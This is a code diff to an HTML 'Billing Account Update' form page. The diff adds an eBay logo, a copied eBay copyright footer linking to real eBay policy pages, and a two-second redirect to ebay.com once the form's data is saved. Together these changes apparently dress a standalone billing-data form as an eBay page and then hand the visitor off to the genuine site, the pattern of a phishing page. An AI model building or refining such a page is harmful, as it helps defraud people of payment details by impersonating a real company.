@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Billing Account Update</title>
     <style>
-        body { font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; }
+        body { font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background-color: white;}
         .form-group { margin-bottom: 15px; }
         label { display: block; margin-bottom: 5px; }
         input, select { width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 4px; }
@@ -14,9 +14,12 @@
         .status-message { margin-top: 15px; padding: 10px; border-radius: 4px; }
         .success { background-color: #d4edda; color: #155724; }
         .error { background-color: #f8d7da; color: #721c24; }
+        footer {max-width: 1000px; }
     </style>
 </head>
 <body>
+
+    <img src="ebay.jpg">
     <h1>Billing Account Update</h1>
     <form id="billingForm">
         <div class="form-group">
@@ -67,6 +70,9 @@
     </form>
     
     <div id="statusMessage"></div>
+    <div id="footer">
+        <footer style="position: sticky; font-family: Arial, Helvetica, sans-serif; font-weight: lighter; color: black; font-size: 13px; margin-top: 80px;">Copyright © 1995-2026 eBay Inc. All Rights Reserved. <a style="color:#62a1db;" href="https://www.ebayinc.com/accessibility/">Accessibility</a>, <a style="color:#62a1db;" href="https://www.ebay.com/help/policies/member-behaviour-policies/user-agreement?id=4259">User Agreement</a>, <a style="color:#62a1db;" href="https://www.ebay.com/help/policies/member-behaviour-policies/user-privacy-notice-privacy-policy?id=4260">Privacy</a>, <a style="color:#62a1db;" href="https://www.ebayinc.com/company/privacy-center/privacy-notice/consumer-health-data-privacy-policy/">Consumer Health Data</a>, <a style="color:#62a1db;" href="https://pages.ebay.com/payment/2.0/terms.html">Payments Terms of Use</a>, <a style="color:#62a1db;" href="https://www.ebay.com/help/policies/member-behaviour-policies/ebay-cookie-notice?id=4267">Cookies</a>, <a style="color:#62a1db;" href="https://www.ebayinc.com/company/privacy-center/privacy-notice/state-privacy-disclosures/#california">CA Privacy Notice</a>, <a style="color:#62a1db;" href="https://www.ebay.com/adchoice/ccpa">Your Privacy Choices</a> and <a style="color:#62a1db;" href="https://www.ebay.com/adchoice">AdChoice</a></footer>
+    </div>
 
     <script>
 
@@ -130,6 +136,9 @@
                 console.warn("Server offline, saving locally...");
                 saveToQueue(data); // Save to localStorage
                 alert("Saved locally. Will sync when server is online.");
+                    setTimeout(() => {
+                        window.location.href = 'https://www.ebay.com';
+                    }, 2000); // redirect after 2 seconds
             }
         });
 
